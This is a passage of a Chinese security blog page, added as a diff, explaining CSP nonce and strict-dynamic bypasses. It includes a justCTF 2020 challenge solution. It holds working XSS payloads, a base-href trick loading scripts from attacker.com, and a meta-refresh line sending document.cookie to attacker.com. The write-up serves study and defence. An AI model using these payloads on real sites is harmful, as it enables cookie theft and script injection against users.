@@ -1,0 +1,1301 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-flash.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Monda:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Bypass,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Tyaoo's Blog" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="关于CSP中nonce&amp;amp;strict-dynamic机制分析和绕过">
+<meta name="keywords" content="Bypass">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CSP nonce&amp;strict-dynamic Bypass">
+<meta property="og:url" content="https://tyaoo.github.io/2021/02/17/nonce-strict-dynamic-bypass/index.html">
+<meta property="og:site_name" content="Tyaoo&#39;s Blog">
+<meta property="og:description" content="关于CSP中nonce&amp;amp;strict-dynamic机制分析和绕过">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021021515253cef4728db75de5a220c.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021021515255cf45fd8fa67cb1ec1b4.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102151525a2fdf924894d84bc0d1c.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021021515258ef91bc2f07f0249024d.png">
+<meta property="og:updated_time" content="2021-02-17T08:49:08.030Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="CSP nonce&amp;strict-dynamic Bypass">
+<meta name="twitter:description" content="关于CSP中nonce&amp;amp;strict-dynamic机制分析和绕过">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021021515253cef4728db75de5a220c.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://tyaoo.github.io/2021/02/17/nonce-strict-dynamic-bypass/">
+
+
+
+
+
+  <title>CSP nonce&strict-dynamic Bypass | Tyaoo's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Tyaoo's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://tyaoo.github.io/2021/02/17/nonce-strict-dynamic-bypass/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tyaoo">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tyaoo's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">CSP nonce&strict-dynamic Bypass</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-02-17T16:46:20+08:00">
+                2021-02-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>关于CSP中nonce&amp;strict-dynamic机制分析和绕过</p>
+<a id="more"></a>
+
+<h2 id="前提知识"><a href="#前提知识" class="headerlink" title="前提知识"></a>前提知识</h2><p>众所周知，CSP的默认策略是不允许inline脚本执行，想要运行inline脚本需要进行如下设置</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src <span class="string">'unsafe-inline'</span></span><br></pre></td></tr></table></figure>
+
+<p>但是为了防止恶意脚本的注入，CSP引入了nonce机制和script-dynamic机制</p>
+<h2 id="探究nonce机制"><a href="#探究nonce机制" class="headerlink" title="探究nonce机制"></a>探究nonce机制</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>参考<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src" target="_blank" rel="noopener">MDN的标准</a></p>
+<blockquote>
+<p><strong>nonce-&lt;base64-value&gt;</strong></p>
+<p>An allow-list for specific inline scripts using a cryptographic nonce (number used once). The server must generate a unique nonce value each time it transmits a policy. It is critical to provide an unguessable nonce, as bypassing a resource’s policy is otherwise trivial. See <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src#unsafe_inline_script" target="_blank" rel="noopener">unsafe inline script</a> for an example. Specifying nonce makes a modern browser ignore <code>&#39;unsafe-inline&#39;</code> which could still be set for older browsers without nonce support.</p>
+<p><strong>Note:</strong> The CSP <code>nonce</code> source can only be apply <em>nonceable</em> elements (e.g. as the <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/img" target="_blank" rel="noopener"><code>&lt;img&gt;</code></a> element has no <code>nonce</code> attribute, there is no way to associate it with this CSP source).</p>
+</blockquote>
+<p>使用一个随机<code>nonce</code>来控制白名单，即可允许执行脚本，所以需要确保<code>nonce</code>是随机生成的，而且这个<code>nonce</code>会忽略<code>unsafe-inline</code>属性</p>
+<p><strong>例子</strong></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src <span class="string">'nonce-test'</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">"test"</span>&gt;</span></span><br><span class="line"><span class="actionscript"><span class="comment">// 可以执行</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript"><span class="comment">// 不能执行</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="常见绕过思路"><a href="#常见绕过思路" class="headerlink" title="常见绕过思路"></a>常见绕过思路</h3><h4 id="浏览器自动补全"><a href="#浏览器自动补全" class="headerlink" title="浏览器自动补全"></a><strong>浏览器自动补全</strong></h4><blockquote>
+<p>Firefox、IE成功，Chrome失败</p>
+</blockquote>
+<p>如果在nonce上方存在XSS注入，则可以直接通过标签闭合使nonce成为自己的属性</p>
+<p>实例</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    header(<span class="string">"X-XSS-Protection:0"</span>);</span><br><span class="line">    header(<span class="string">"Content-Security-Policy: default-src 'self'; script-src 'nonce-test'"</span>);</span><br><span class="line">    <span class="keyword">echo</span> $_GET[<span class="string">'xss'</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;script nonce=<span class="string">'test'</span>&gt;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>payload</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?xss=<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">data:text/plain,alert(1)</span></span></span><br></pre></td></tr></table></figure>
+
+<h4 id="Base-uri绕过"><a href="#Base-uri绕过" class="headerlink" title="Base-uri绕过"></a><strong>Base-uri绕过</strong></h4><p>如果base-uri没有被设置，那我们可以使用<code>&lt;base&gt;</code>将文档的基础uri改为自己的服务器，引入自定义的js文件</p>
+<p>例子</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    header(<span class="string">"Content-Security-Policy: default-src 'self'; script-src 'nonce-test'"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;base href=<span class="string">"//attacker.com"</span>&gt;</span><br><span class="line">&lt;script nonce=<span class="string">'test'</span> src=<span class="string">"/main.js"</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="meta标签绕过"><a href="#meta标签绕过" class="headerlink" title="meta标签绕过"></a><strong>meta标签绕过</strong></h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"refresh"</span> <span class="attr">content</span>=<span class="string">"1;url=http://attacker.com/receive.php?c="</span>+<span class="attr">escape</span>(<span class="attr">document.cookie</span>)) &gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="浏览器缓存绕过"><a href="#浏览器缓存绕过" class="headerlink" title="浏览器缓存绕过"></a><strong>浏览器缓存绕过</strong></h4><p>具体步骤可参考这篇<a href="https://www.freebuf.com/articles/web/133455.html" target="_blank" rel="noopener">文章</a></p>
+<p>攻击能够实现的原因有2个：</p>
+<ul>
+<li>浏览器开启了缓存，只修改location.hash不会请求服务器，给我们能够窃取nonce的机会</li>
+<li>利用iframe标签窃取nonce并实现任意XSS</li>
+</ul>
+<h4 id="输出缓冲区溢出绕过"><a href="#输出缓冲区溢出绕过" class="headerlink" title="输出缓冲区溢出绕过"></a><strong>输出缓冲区溢出绕过</strong></h4><p>实例源于<a href="https://github.com/justcatthefish/justctf-2020/tree/master/challenges/web_baby-csp" target="_blank" rel="noopener">justCTF 2020 babyCSP</a></p>
+<blockquote>
+<p>因为在官方靶机复现的时候最后没打打到admin那，本地搭环境发现要用域名在google注册reCAPTCHA服务，所以下面主要是讲绕过CSP nonce的部分</p>
+</blockquote>
+<p>题目核心代码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">"secrets.php"</span>);</span><br><span class="line">$nonce = random_bytes(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>]))&#123;</span><br><span class="line"> <span class="keyword">if</span>(isAdmin())&#123;</span><br><span class="line">    header(<span class="string">'X-Content-Type-Options: nosniff'</span>);</span><br><span class="line">    header(<span class="string">'X-Frame-Options: DENY'</span>);</span><br><span class="line">    header(<span class="string">'Content-type: text/html; charset=UTF-8'</span>);</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">"You are not an admin!"</span>;</span><br><span class="line">     <span class="keyword">die</span>();</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>; $i&lt;<span class="number">10</span>; $i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'alg'</span>]))&#123;</span><br><span class="line">        $_nonce = hash($_GET[<span class="string">'alg'</span>], $nonce);</span><br><span class="line">        <span class="keyword">if</span>($_nonce)&#123;</span><br><span class="line">            $nonce = $_nonce;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $nonce = md5($nonce);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'user'</span>]) &amp;&amp; strlen($_GET[<span class="string">'user'</span>]) &lt;= <span class="number">23</span>) &#123;</span><br><span class="line">    header(<span class="string">"content-security-policy: default-src 'none'; style-src 'nonce-$nonce'; script-src 'nonce-$nonce'"</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&lt;&lt;&lt;EOT</span></span><br><span class="line"><span class="string">        &lt;script nonce='<span class="subst">$nonce</span>'&gt;</span></span><br><span class="line"><span class="string">            setInterval(</span></span><br><span class="line"><span class="string">                ()=&gt;user.style.color=Math.random()&lt;0.3?'red':'black'</span></span><br><span class="line"><span class="string">            ,100);</span></span><br><span class="line"><span class="string">        &lt;/script&gt;</span></span><br><span class="line"><span class="string">        &lt;center&gt;&lt;h1&gt; Hello &lt;span id='user'&gt;<span class="subst">&#123;$_GET['user']&#125;</span>&lt;/span&gt;!!&lt;/h1&gt;</span></span><br><span class="line"><span class="string">        &lt;p&gt;Click &lt;a href="?flag"&gt;here&lt;/a&gt; to get a flag!&lt;/p&gt;</span></span><br><span class="line"><span class="string">EOT;</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Found a bug? We want to hear from you! /bugbounty.php</span></span><br><span class="line"><span class="comment">// Check /Dockerfile</span></span><br></pre></td></tr></table></figure>
+
+<p>漏洞的核心在于在执行<code>header()</code>之前会对nonce进行计算，hash的seed可控且无长度限制，当我们输入alg参数是，页面会输出warning</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021021515253cef4728db75de5a220c.png" alt="image-20210215102946344"></p>
+<p>参考PHP文档的<a href="https://www.php.net/manual/en/outcontrol.configuration.php#outcontrol.configuration" target="_blank" rel="noopener">Runtime Configuration</a></p>
+<blockquote>
+<p><code>output_buffering</code> bool/int</p>
+<p>You can enable output buffering for all files by setting this directive to ‘On’. If you wish to limit the size of the buffer to a certain size - you can use a maximum number of bytes instead of ‘On’, as a value for this directive (e.g., output_buffering=4096). This directive is always Off in PHP-CLI.</p>
+</blockquote>
+<p>PHP具有多个种类的输出缓冲区，输出缓冲区默认大小是<strong>4096 bytes</strong>，HTTP缓冲区负责存储HTTP Header和HTTP Body，如果缓冲区超过最大限制就会强制刷新，所以只要我们输入的alg参数足够长，就能导致缓冲区溢出，从而使header修改失败</p>
+<blockquote>
+<p>注意CLI的输出缓冲区比较特别，CLI会将INI配置中的<em>output_buffer</em>选项强制设置为0，这表示禁用默认PHP输出缓冲区</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021021515255cf45fd8fa67cb1ec1b4.png" alt="image-20210215105539720"></p>
+<p>在web中查看，你可以再一次确定输出缓冲区默认大小是<strong>4096 bytes</strong></p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102151525a2fdf924894d84bc0d1c.png" alt="image-20210215105440404"></p>
+<p>注入足够长度的参数会header就会无法修改从而绕过CSP，此时插入XSS便能攻击成功</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021021515258ef91bc2f07f0249024d.png" alt="image-20210215140908083"></p>
+<p>所以前半部分的payload如下</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    name=<span class="string">"fetch('?flag').then(e=&gt;e.text()).then(alert)"</span></span></span><br><span class="line"><span class="actionscript">    location = <span class="string">'https://127.0.0.1:10001/?user=%3Csvg%20onload=eval(name)%3E&amp;alg='</span>+<span class="string">'a'</span>.repeat(<span class="string">'292'</span>);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="探究strict-dynamic机制"><a href="#探究strict-dynamic机制" class="headerlink" title="探究strict-dynamic机制"></a>探究strict-dynamic机制</h2><h3 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h3><p>参考<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src" target="_blank" rel="noopener">MDN的标准</a></p>
+<blockquote>
+<p><strong>strict-dynamic</strong></p>
+<p>The <code>strict-dynamic</code> source expression specifies that the trust explicitly given to a script present in the markup, by accompanying it with a nonce or a hash, shall be propagated to all the scripts loaded by that root script. At the same time, any allow-list or source expressions such as <code>&#39;self&#39;</code> or <code>&#39;unsafe-inline&#39;</code> are ignored. See <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src#strict-dynamic" target="_blank" rel="noopener">script-src</a> for an example.</p>
+</blockquote>
+<p><code>strict-dynamic</code>规定需要给可允许执行脚本一个明确的<code>nonce</code>或者<code>hash</code>，防止因为白名单存在相关漏洞而被引入恶意脚本，同时也会忽略<code>self</code>和<code>unsafe-inline</code>属性</p>
+<p><strong>例子</strong></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src <span class="string">'nonce-test'</span> <span class="string">'strict-dynamic'</span> example.com</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"//example.com/assets/A.js"</span> <span class="attr">nonce</span>=<span class="string">"test"</span>&gt;</span></span><br><span class="line"><span class="actionscript"><span class="comment">// 可以执行</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"//example.com/assets/B.js"</span>&gt;</span></span><br><span class="line"><span class="actionscript"><span class="comment">// 不能执行</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="常见绕过思路-1"><a href="#常见绕过思路-1" class="headerlink" title="常见绕过思路"></a>常见绕过思路</h3><h4 id="通过CSS泄露nonce"><a href="#通过CSS泄露nonce" class="headerlink" title="通过CSS泄露nonce"></a><strong>通过CSS泄露nonce</strong></h4><p>主要参考这篇<a href="http://sirdarckcat.blogspot.com/2016/12/how-to-bypass-csp-nonces-with-dom-xss.html" target="_blank" rel="noopener">文章</a>，可以说一种侧信道攻击</p>
+<p>CSS攻击原理都一样，先进行匹配然后通过url进行回显，具体就不多说了</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// 1</span><br><span class="line">*<span class="selector-attr">[attribute^="a"]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"record?match=a"</span>)&#125;</span><br><span class="line">*<span class="selector-attr">[attribute^="b"]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"record?match=b"</span>)&#125;</span><br><span class="line">*<span class="selector-attr">[attribute^="c"]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"record?match=c"</span>)&#125;</span><br><span class="line"><span class="selector-attr">[...]</span></span><br><span class="line"></span><br><span class="line">// 2</span><br><span class="line">*<span class="selector-attr">[attribute^="aa"]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"record?match=aa"</span>)&#125;</span><br><span class="line">*<span class="selector-attr">[attribute^="ab"]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"record?match=ab"</span>)&#125;</span><br><span class="line">*<span class="selector-attr">[attribute^="ac"]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"record?match=ac"</span>)&#125;</span><br><span class="line"><span class="selector-attr">[...]</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="Script-Gadget"><a href="#Script-Gadget" class="headerlink" title="Script Gadget"></a><strong>Script Gadget</strong></h4><p>使用某个HTML或者JS文件中现存的特定的JS代码来绕过CSP，这个是我们本次学习的重点</p>
+<h2 id="Script-Gadget-1"><a href="#Script-Gadget-1" class="headerlink" title="Script Gadget"></a>Script Gadget</h2><blockquote>
+<p>参考2017年blackhat的《<a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf" target="_blank" rel="noopener">Breaking XSS mitigations via Script Gadgets</a>》</p>
+<p>Github: <a href="https://github.com/google/security-research-pocs" target="_blank" rel="noopener">https://github.com/google/security-research-pocs</a></p>
+</blockquote>
+<h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p><strong>在HTML代码中</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">data-role</span>=<span class="string">"button"</span></span></span><br><span class="line"><span class="tag"><span class="attr">data-text</span>=<span class="string">"I am a button"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"> <span class="keyword">var</span> buttons = $(<span class="string">"[data-role=button]"</span>);</span></span><br><span class="line"><span class="actionscript"> buttons.html(button.getAttribute(<span class="string">"data-text"</span>)); <span class="comment">// 注入点</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>所以可以构造如下语句进行注入</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">data-role</span>=<span class="string">"button"</span> <span class="attr">data-text</span>=<span class="string">"&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;"</span>&gt;</span>...<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>在JS代码中</strong></p>
+<p>以Knockout Gadget为例</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取data-bind属性</span></span><br><span class="line"><span class="keyword">switch</span> (node.nodeType) &#123;</span><br><span class="line"> <span class="keyword">case</span> <span class="number">1</span>: <span class="keyword">return</span> node.getAttribute(<span class="string">"data-bind"</span>);</span><br><span class="line"><span class="comment">// 写入到rewrittenBindings</span></span><br><span class="line"><span class="keyword">var</span> rewrittenBindings = ko.expressionRewriting.preProcessBindings(bindingsString, options),</span><br><span class="line"> functionBody = <span 